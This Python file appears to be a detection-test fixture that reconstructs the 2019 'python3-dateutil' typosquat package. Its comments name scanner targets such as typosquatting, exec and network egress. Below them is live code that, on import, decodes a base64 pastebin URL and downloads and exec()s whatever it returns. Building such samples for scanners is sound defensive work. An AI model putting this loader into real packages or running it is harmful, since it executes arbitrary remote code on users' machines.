# python3-dateutil@2.9.5 (Dec 2019). Sibling of jeIlyfish in the
# same campaign — typosquat of python-dateutil with the canonical
# leading "python3-" prefix. Real python-dateutil is "python-dateutil".
# Public write-up:
# https://github.com/dateutil/dateutil/issues/984
#
# Detection target:
#   - typosquat-risk (python3-dateutil vs python-dateutil; the
#                     'dateutil' bare name is also in the top-list)
#   - dynamic-eval   (exec)
#   - net-egress     (urllib.request.urlopen)
#   - base64-decode  (base64.b64decode of stage-2 URL)

import base64
import urllib.request


def _harvest():
    url = base64.b64decode(b"aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1lZWQ==").decode()
    payload = urllib.request.urlopen(url).read()
    exec(payload)


_harvest()
